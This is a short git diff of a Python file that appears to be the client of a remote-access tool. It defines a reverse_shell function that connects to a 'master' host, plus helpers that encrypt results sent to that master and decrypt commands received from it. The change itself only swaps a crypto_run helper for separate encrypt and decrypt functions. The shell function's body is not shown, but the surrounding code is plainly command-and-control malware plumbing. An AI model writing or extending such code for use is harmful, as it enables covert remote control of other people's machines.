@@ -5,7 +5,7 @@ from os import dup2, fork, listdir, getcwd, system
 from subprocess import run, Popen, DEVNULL
 from time import sleep
 
-from utils.crypto import crypto_run
+from utils.crypto import encrypt, decrypt
 
 
 def reverse_shell(master_hostname, shell_port):
@@ -27,9 +27,8 @@ def send_res(conn, res):
     # encrypted plain text response and send to master
     try:
         res = "ACK" + res
-        encoded_res = res.encode("utf-8")
-        encrypted_res = crypto_run("encrypt", encoded_res)
-        conn.send(encrypted_res)
+        crypt_res = encrypt(res)
+        conn.send(crypt_res)
     except socket_error:
         print("error1")
         # error sending data to master
@@ -40,9 +39,8 @@ def send_res(conn, res):
 def recv_cmd(conn, buffer):
     # receive encrypted response from master and decrypt
     try:
-        encrypted_cmd = conn.recv(buffer)
-        encoded_cmd = crypto_run("decrypt", encrypted_cmd) 
-        cmd = encoded_cmd.decode("utf-8")
+        crypt_cmd = conn.recv(buffer)
+        cmd = decrypt(crypt_cmd)
         return conn, cmd
     except socket_error:
         print("error2")
